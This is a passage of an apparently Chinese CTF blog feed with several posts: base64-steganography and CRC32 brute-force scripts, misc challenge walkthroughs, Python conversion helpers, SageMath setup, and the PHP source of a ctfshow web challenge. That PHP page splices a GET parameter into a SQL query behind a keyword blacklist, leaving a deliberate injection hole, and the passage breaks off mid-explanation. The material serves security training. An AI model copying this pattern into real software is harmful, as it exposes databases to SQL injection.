class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vim">#python2<br>b64chars = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br>with <span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-keyword">f</span>:<br>    bin_str = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> <span class="hljs-built_in">line</span> in <span class="hljs-keyword">f</span>.readlines():<br>        stegb64 = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-keyword">join</span>(<span class="hljs-built_in">line</span>.<span class="hljs-keyword">split</span>())<br>        rowb64 =  <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-keyword">join</span>(stegb64.decode(<span class="hljs-string">&#x27;base64&#x27;</span>).encode(<span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-keyword">split</span>())<br>        offset = <span class="hljs-built_in">abs</span>(b64chars.<span class="hljs-built_in">index</span>(stegb64.replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>])-b64chars.<span class="hljs-built_in">index</span>(rowb64.replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>]))<br>        equalnum = stegb64.<span class="hljs-built_in">count</span>(<span class="hljs-string">&#x27;=&#x27;</span>) #no equalnum <span class="hljs-keyword">no</span> offset<br>        <span class="hljs-keyword">if</span> equalnum:<br>            bin_str += bin(offset)[<span class="hljs-number">2</span>:].zfill(equalnum * <span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-keyword">join</span>([chr(<span class="hljs-keyword">int</span>(bin_str[i:i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> i in xrange(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bin_str), <span class="hljs-number">8</span>)]) <br><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-id">#python2</span><br>def get_base64_diff_value(s1, s2):<br>    base64chars = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br>    res = <span class="hljs-number">0</span><br>    for i in <span class="hljs-built_in">xrange</span>(<span class="hljs-built_in">len</span>(s2)):<br>        if s1[i] != s2[i]:<br>            return <span class="hljs-built_in">abs</span>(base64chars.<span class="hljs-built_in">index</span>(s1[i]) - base64chars.<span class="hljs-built_in">index</span>(s2[i]))<br>    return res<br><br><br>def <span class="hljs-built_in">solve_stego</span>():<br>    with <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) as f:<br>        file_lines = f.<span class="hljs-built_in">readlines</span>()<br>        bin_str = <span class="hljs-string">&#x27;&#x27;</span><br>        for line in file_lines:<br>            steg_line = line.<span class="hljs-built_in">replace</span>(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            norm_line = line.<span class="hljs-built_in">replace</span>(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).<span class="hljs-built_in">decode</span>(<span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-built_in">encode</span>(<span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-built_in">replace</span>(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            diff = <span class="hljs-built_in">get_base64_diff_value</span>(steg_line, norm_line)<br>            print diff<br>            pads_num = steg_line.<span class="hljs-built_in">count</span>(<span class="hljs-string">&#x27;=&#x27;</span>)<br>            if diff:<br>                bin_str += <span class="hljs-built_in">bin</span>(diff)[<span class="hljs-number">2</span>:].<span class="hljs-built_in">zfill</span>(pads_num * <span class="hljs-number">2</span>)<br>            else:<br>                bin_str += <span class="hljs-string">&#x27;0&#x27;</span> * pads_num * <span class="hljs-number">2</span><br>            print <span class="hljs-built_in">goflag</span>(bin_str)<br><br><br>def <span class="hljs-built_in">goflag</span>(bin_str):<br>    res_str = <span class="hljs-string">&#x27;&#x27;</span><br>    for i in <span class="hljs-built_in">xrange</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bin_str), <span class="hljs-number">8</span>):<br>        res_str += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(bin_str[i:i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>))<br>    return res_str<br><br><br>if __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">solve_stego</span>()<br><br></code></pre></td></tr></table></figure><h1 id="CRC32碰撞"><a href="#CRC32碰撞" class="headerlink" title="CRC32碰撞"></a>CRC32碰撞</h1><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">import</span> binascii<br><span class="hljs-attribute">import</span> string<br><br><span class="hljs-attribute">dic</span>=string.printable  <br><span class="hljs-attribute">crc1</span> = <span class="hljs-number">0</span>xe<span class="hljs-number">5</span>c<span class="hljs-number">67</span>f<span class="hljs-number">46</span>  <br><span class="hljs-attribute">crc2</span> = <span class="hljs-number">0</span>x<span class="hljs-number">555</span>fa<span class="hljs-number">1</span>a<span class="hljs-number">2</span><br><span class="hljs-attribute">crc3</span> = <span class="hljs-number">0</span>x<span class="hljs-number">6</span>e<span class="hljs-number">957</span>e<span class="hljs-number">45</span><br><span class="hljs-attribute">crc4</span> = <span class="hljs-number">0</span>x<span class="hljs-number">76</span>d<span class="hljs-number">6</span>a<span class="hljs-number">31</span>a<br><span class="hljs-attribute">crc5</span> = <span class="hljs-number">0</span>x<span class="hljs-number">2</span>b<span class="hljs-number">042586</span><br><br><span class="hljs-attribute">def</span> CrackCrc<span class="hljs-number">4</span>(crc):<br>    <span class="hljs-attribute">for</span> i in dic :<br>        <span class="hljs-attribute">for</span> j in dic:<br>            <span class="hljs-attribute">for</span> p in dic:<br>                <span class="hljs-attribute">for</span> q in dic:<br>                        <span class="hljs-attribute">s</span>=i+j+p+q<br>                        <span class="hljs-attribute">if</span> crc == (binascii.crc<span class="hljs-number">32</span>(s.encode(<span class="hljs-string">&quot;ascii&quot;</span>))):<br>                            <span class="hljs-attribute">print</span> (s)<br>                            <span class="hljs-attribute">return</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">CrackCrc4</span>(crc<span class="hljs-number">1</span>)<br><span class="hljs-attribute">CrackCrc4</span>(crc<span class="hljs-number">2</span>)<br><span class="hljs-attribute">CrackCrc4</span>(crc<span class="hljs-number">3</span>)<br><span class="hljs-attribute">CrackCrc4</span>(crc<span class="hljs-number">4</span>)<br><span class="hljs-attribute">CrackCrc4</span>(crc<span class="hljs-number">5</span>)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;base一把梭&quot;&gt;&lt;a href=&quot;#base一把梭&quot; class=&quot;headerlink&quot; title=&quot;base一把梭&quot;&gt;&lt;/a&gt;base一把梭&lt;/h1&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class</summary>
      
    
    
    
    
    <category term="misc" scheme="https://zhangkaibin0921.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>misc题目</title>
    <link href="https://zhangkaibin0921.github.io/2022/02/25/misc%E9%A2%98%E7%9B%AE/"/>
    <id>https://zhangkaibin0921.github.io/2022/02/25/misc%E9%A2%98%E7%9B%AE/</id>
    <published>2022-02-25T12:09:31.000Z</published>
    <updated>2022-03-03T08:33:31.280Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HSC-1th-汝闻，人言否"><a href="#HSC-1th-汝闻，人言否" class="headerlink" title="HSC-1th 汝闻，人言否"></a>HSC-1th 汝闻，人言否</h1><p>题目只给了一张图片，并无任务提示了。<br>我当时我把我能想到的图片隐写全部用上了，看属性，strings，zsteg，LSB，改颜色通道，改宽高，binwalk，看十六进制。都没有找到。</p><p>题目解法：<br>010editor，搜索png的文件0000000049454E44AE426082<br><img src="/picture/misc60.png"><br>文件尾结束之后，后面仍让有内容，看到PK，4B50改成504B</p><p><img src="/picture/misc61.png"><br>文件尾部的也需要更改</p><p>然后binwalk拿到压缩包，压缩包有密码<br>给了提示qazsedcftrfvgycft6yhntgbnytfvbhyik,.;p<br>使用键盘画图（看轨迹），拿到密码WVALOU，打开看到flag文件，丢入010editor，看到是wav类型的，更改后缀名，看频谱图拿到flag</p><h1 id="buu-弱口令"><a href="#buu-弱口令" class="headerlink" title="buu-弱口令"></a>buu-弱口令</h1><p>压缩包有附加信息，不过是由空格、回车和Table组成的，所以看不到<br><img src="/picture/misc62.png"><br>复制到sublime中，因为sublime可以可视化空格和回车<br><img src="/picture/misc63.png"><br>将空格替换为 .    Table为-<br>得到…. . .-.. .-.. —– ..-. — .-. ..- –<br>解密为HELL0FORUM</p><h1 id="buu-喵喵喵"><a href="#buu-喵喵喵" class="headerlink" title="buu-喵喵喵"></a>buu-喵喵喵</h1><p>拿到一张图片丢入stegsolve中，lsb看到一张图片，保存，看到半张二维码，更改高度，得到整张二维码。扫码得到一个网盘地址，下载压缩包，里面只有一个txt文件，说flag不在这里。</p><p><img src="/picture/misc64.png"><br>我看到了flag.pyc<br>我竟然在傻傻的想，压缩包能不能binwalk</p><p>看别人的wp，知道这是NTFS文件流隐写，<strong>看到txt文件，并且毫无头绪一定要想到ntfs</strong></p><p>这里注意要用<code>winrar</code> 解压,因为是winrar 压缩的不然是得不到东西的<br>使用NtfsStreamsEditor<br><img src="/picture/misc65.png"></p><p>uncompyle6 flag.pyc &gt; 111.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode</span>():</span><br>    flag = <span class="hljs-string">&#x27;*************&#x27;</span><br>    ciphertext = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)):<br>        s = <span class="hljs-built_in">chr</span>(i ^ <span class="hljs-built_in">ord</span>(flag[i]))<br>        <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>            s = <span class="hljs-built_in">ord</span>(s) + <span class="hljs-number">10</span><br>        <span class="hljs-keyword">else</span>:<br>            s = <span class="hljs-built_in">ord</span>(s) - <span class="hljs-number">10</span><br>        ciphertext.append(<span class="hljs-built_in">str</span>(s))<br><br>    <span class="hljs-keyword">return</span> ciphertext[::-<span class="hljs-number">1</span>]<br><br><br>ciphertext = [<br> <span class="hljs-string">&#x27;96&#x27;</span>, <span class="hljs-string">&#x27;65&#x27;</span>, <span class="hljs-string">&#x27;93&#x27;</span>, <span class="hljs-string">&#x27;123&#x27;</span>, <span class="hljs-string">&#x27;91&#x27;</span>, <span class="hljs-string">&#x27;97&#x27;</span>, <span class="hljs-string">&#x27;22&#x27;</span>, <span class="hljs-string">&#x27;93&#x27;</span>, <span class="hljs-string">&#x27;70&#x27;</span>, <span class="hljs-string">&#x27;102&#x27;</span>, <span class="hljs-string">&#x27;94&#x27;</span>, <span class="hljs-string">&#x27;132&#x27;</span>, <span class="hljs-string">&#x27;46&#x27;</span>, <span class="hljs-string">&#x27;112&#x27;</span>, <span class="hljs-string">&#x27;64&#x27;</span>, <span class="hljs-string">&#x27;97&#x27;</span>, <span class="hljs-string">&#x27;88&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>, <span class="hljs-string">&#x27;82&#x27;</span>, <span class="hljs-string">&#x27;137&#x27;</span>, <span class="hljs-string">&#x27;90&#x27;</span>, <span class="hljs-string">&#x27;109&#x27;</span>, <span class="hljs-string">&#x27;99&#x27;</span>, <span class="hljs-string">&#x27;112&#x27;</span>]<br><br></code></pre></td></tr></table></figure><h1 id="buu-从娃娃抓起"><a href="#buu-从娃娃抓起" class="headerlink" title="buu-从娃娃抓起"></a>buu-从娃娃抓起</h1><p>0086 1562 2535 5174<br>bnhn s wwy vffg vffg rrhy fhnv<br>上面是中文电码，下面是五笔简码</p><h1 id="UTCTF2020-zero"><a href="#UTCTF2020-zero" class="headerlink" title="[UTCTF2020]zero"></a>[UTCTF2020]zero</h1><p>这题考察零宽度字符隐写</p><p><img src="/picture/misc67.png"><br>很正常的一个txt，看不出什么问题</p><p><img src="/picture/misc68.png"><br>用vim看，可以看到很多零宽度字符</p><p><a href="https://330k.github.io/misc_tools/unicode_steganography.html">零宽度字符解密</a></p><h1 id="7、ctfshow-misc10"><a href="#7、ctfshow-misc10" class="headerlink" title="7、ctfshow-misc10"></a>7、ctfshow-misc10</h1><p><img src="/picture/misc78.png"><br>binwalk这样式的也可能藏flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HSC-1th-汝闻，人言否&quot;&gt;&lt;a href=&quot;#HSC-1th-汝闻，人言否&quot; class=&quot;headerlink&quot; title=&quot;HSC-1th 汝闻，人言否&quot;&gt;&lt;/a&gt;HSC-1th 汝闻，人言否&lt;/h1&gt;&lt;p&gt;题目只给了一张图片，并无任务提示了。&lt;br&gt;</summary>
      
    
    
    
    
    <category term="misc" scheme="https://zhangkaibin0921.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>密码学Python常用函数</title>
    <link href="https://zhangkaibin0921.github.io/2022/02/20/%E5%AF%86%E7%A0%81%E5%AD%A6Python%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/"/>
    <id>https://zhangkaibin0921.github.io/2022/02/20/%E5%AF%86%E7%A0%81%E5%AD%A6Python%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</id>
    <published>2022-02-20T11:31:20.000Z</published>
    <updated>2022-03-20T08:40:01.226Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>这是个大坑啊，会慢慢填的</p></blockquote><p>Python2和python3感觉差别还是挺大的（没有标注的代码默认是python3）<br><a href="https://c.runoob.com/compile/6/">Python2 在线工具 | 菜鸟工具 (runoob.com)</a></p><p>python3字节转十六进制字符串</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">s</span>=b&quot;flag&quot;<br><span class="hljs-builtin-name">print</span>(s.hex())<br><span class="hljs-comment">#打印结果：666c6167</span><br></code></pre></td></tr></table></figure><p>十六进制数字转十进制(int函数的使用)</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">s</span>=b&quot;flag&quot;<br><span class="hljs-attribute">x</span>=s.hex()<br><span class="hljs-builtin-name">print</span>(int(x,16))   # x原本是十六进制转换为十进制<br><span class="hljs-comment">#打印结果：1718378855</span><br></code></pre></td></tr></table></figure><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;12&#x27;</span>,<span class="hljs-number">16</span>)        <span class="hljs-comment"># 如果是带参数base的话，12要以字符串的形式进行输入，12 为 16进制 </span></span><br>18<br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0xa&#x27;</span>,<span class="hljs-number">16</span>)  </span><br>10  <br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;10&#x27;</span>,<span class="hljs-number">8</span>)  </span><br>8<br></code></pre></td></tr></table></figure><p>字符串转字节</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">s</span>=<span class="hljs-string">&quot;flag&quot;</span><br><span class="hljs-builtin-name">print</span>(s.encode())<br><span class="hljs-comment">#打印结果:b&#x27;flag&#x27;</span><br></code></pre></td></tr></table></figure><p>字节转字符串</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">s</span>=b&quot;flag&quot;<br><span class="hljs-builtin-name">print</span>(s.decode(<span class="hljs-attribute">encoding</span>=<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><span class="hljs-comment">#打印结果:flag</span><br></code></pre></td></tr></table></figure><p>字符转数字</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">print</span>(<span class="hljs-keyword">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>))<br><span class="hljs-comment">#打印结果:97</span><br></code></pre></td></tr></table></figure><p>python2字符串转十六进制</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#Python2</span><br><span class="hljs-attribute">s</span>=<span class="hljs-string">&quot;flag&quot;</span><br><span class="hljs-builtin-name">print</span> s.encode(<span class="hljs-string">&#x27;hex&#x27;</span>)<br><span class="hljs-comment">#打印结果：666c6167</span><br></code></pre></td></tr></table></figure><p>十六进制字符串和比特流相互转换</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> binascii import *<br><span class="hljs-attribute">c1</span>=<span class="hljs-string">&#x27;56c36&#x27;</span><br><span class="hljs-attribute">c1</span>=unhexlify(c1)<br><span class="hljs-builtin-name">print</span>(c1)     #b<span class="hljs-string">&#x27;V\xc3j&#x27;</span><br><span class="hljs-attribute">c1</span>=hexlify(c1)<br><span class="hljs-builtin-name">print</span>(c1)     #b<span class="hljs-string">&#x27;56c36a&#x27;</span>   这个也是比特形式的<br></code></pre></td></tr></table></figure><p>整数转二进制bin()<br>bin()返回一个整数 int 或者长整数 long int 的二进制表示。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs maxima">&gt;&gt;&gt;bin(<span class="hljs-number">10</span>)<br>&#x27;<span class="hljs-number">0b1010</span>&#x27;<br>&gt;&gt;&gt; bin(<span class="hljs-number">20</span>)<br>&#x27;<span class="hljs-number">0b10100</span>&#x27;<br></code></pre></td></tr></table></figure><hr><blockquote><p>[参考博客](<a href="https://blog.csdn.net/ycf18331272870/article/details/88413838?ops_request_misc=%7B%22request_id%22:%22164535627316780261934174%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=164535627316780261934174&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-88413838.pc_search_insert_es_download&utm_term=python3+%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6&spm=1018.2226.3001.4187">python3 字符串、十六进制字符串、数字、字节之间的转换_羊驼的博客笔记-CSDN博客_python 十六进制字符串转十六进制</a>)<br>参考书目：CTF特训营</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;这是个大坑啊，会慢慢填的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Python2和python3感觉差别还是挺大的（没有标注的代码默认是python3）&lt;br&gt;&lt;a href=&quot;https://c.runoob.com/compile/6/&quot;&gt;P</summary>
      
    
    
    
    
    <category term="Crypto" scheme="https://zhangkaibin0921.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>sagemath的安装与使用</title>
    <link href="https://zhangkaibin0921.github.io/2022/02/14/sagemath%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <id>https://zhangkaibin0921.github.io/2022/02/14/sagemath%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</id>
    <published>2022-02-14T11:19:16.000Z</published>
    <updated>2022-02-14T11:35:22.666Z</updated>
    
    <content type="html"><![CDATA[<h2 id="sage的安装"><a href="#sage的安装" class="headerlink" title="sage的安装"></a>sage的安装</h2><p>我是用kali安装的sage<br><a href="https://www.sagemath.org/download.html">https://www.sagemath.org/download.html</a><br>进入这个网址<br><img src="/picture/c7.png"><br>Asia中随便选一个进入</p><p><img src="/picture/c8.png"><br>选Linux<br>然后进入下一个界面，选64bits</p><p><img src="/picture/c9.png"><br>然后我选的是红色框中的</p><p>接下来就是等待下载完成<br><code>tar xvf sage-9.0-Debian_GNU_Linux_9-x86_64.tar.bz2</code><br>然后解压压缩包，解压时间有点长，一定耐心等待啊</p><p>在sageMath的文件夹下<br><code>./sage</code><br>之后就可以交互式的使用sage了</p><hr><h2 id="sage的简单使用"><a href="#sage的简单使用" class="headerlink" title="sage的简单使用"></a>sage的简单使用</h2><p>每次在sageMath下  <code>./sage</code> 进行交互式的sage使用<br>或者把sage代码写在一个  test.sage中 ，然后使用命令  <code>./sage test.sage</code> 即可</p><p>sage模块的安装<br>python的模块，sage好像不可以直接使用<br>比如我在代码里import libnum 了，我使用python是有这个模块的，但是我用sage运行，就一直会说没有这个模块<br><code>sage -pip install libnum</code></p><hr><p><a href="https://www.osgeo.cn/sagemath/tutorial/index.html">sage的中文教程</a></p><hr><blockquote><p>需要非常感谢<a href="https://blog.csdn.net/vanarrow/article/details/106051909">这篇博客</a>，我才得以顺利完成sage的安装</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;sage的安装&quot;&gt;&lt;a href=&quot;#sage的安装&quot; class=&quot;headerlink&quot; title=&quot;sage的安装&quot;&gt;&lt;/a&gt;sage的安装&lt;/h2&gt;&lt;p&gt;我是用kali安装的sage&lt;br&gt;&lt;a href=&quot;https://www.sagemath.or</summary>
      
    
    
    
    
    <category term="Crypto" scheme="https://zhangkaibin0921.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow 萌新web1~7</title>
    <link href="https://zhangkaibin0921.github.io/2022/02/13/ctfshow-%E8%90%8C%E6%96%B0web1-7/"/>
    <id>https://zhangkaibin0921.github.io/2022/02/13/ctfshow-%E8%90%8C%E6%96%B0web1-7/</id>
    <published>2022-02-13T12:28:50.000Z</published>
    <updated>2022-02-14T07:16:18.251Z</updated>
    
    <content type="html"><![CDATA[<p>所有题目只有过滤的字符有差别，其余并无差别，下面给出的代码是web7的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;<br>    &lt;meta charset=&quot;utf-8&quot;&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;?php<br># 包含数据库连接文件<br>include(&quot;config.php&quot;);<br># 判断get提交的参数id是否存在<br>if(isset($_GET[&#x27;id&#x27;]))&#123;<br>        $id = $_GET[&#x27;id&#x27;];<br>    if(preg_match(&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|\~|x|hex|\(|\)|\+|select/i&quot;,$id))&#123;<br>            die(&quot;id error&quot;);<br>    &#125;<br>    # 判断id的值是否大于999<br>    if(intval($id) &gt; 999)&#123;<br>        # id 大于 999 直接退出并返回错误<br>        die(&quot;id error&quot;);<br>    &#125;else&#123;<br>        # id 小于 999 拼接sql语句<br>        $sql = &quot;select * from article where id = $id order by id limit 1 &quot;;<br>        echo &quot;执行的sql为：$sql&lt;br&gt;&quot;;<br>        # 执行sql 语句<br>        $result = $conn-&gt;query($sql);<br>        # 判断有没有查询结果<br>        if ($result-&gt;num_rows &gt; 0) &#123;<br>            # 如果有结果，获取结果对象的值$row<br>            while($row = $result-&gt;fetch_assoc()) &#123;<br>                echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - title: &quot; . $row[&quot;title&quot;]. &quot; &lt;br&gt;&lt;hr&gt;&quot; . $row[&quot;content&quot;]. &quot;&lt;br&gt;&quot;;<br>            &#125;<br>        &#125;<br>        # 关闭数据库连接<br>        $conn-&gt;close();<br>    &#125;<br>    <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br><br>?&gt;<br>&lt;/body&gt;<br>&lt;!-- flag in id = 1000 --&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><blockquote><p> 这其中有个函数非常关键，intval()<br><a href="https://www.runoob.com/php/php-intval-function.html">PHP intval() 函数 | 菜鸟教程 (runoob.com)</a></p><p>成功时返回 var 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。<br>最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。<br>字符串有可能返回 0，虽然取决于字符串最左侧的字符</p><p><strong>看实例非常重要</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> 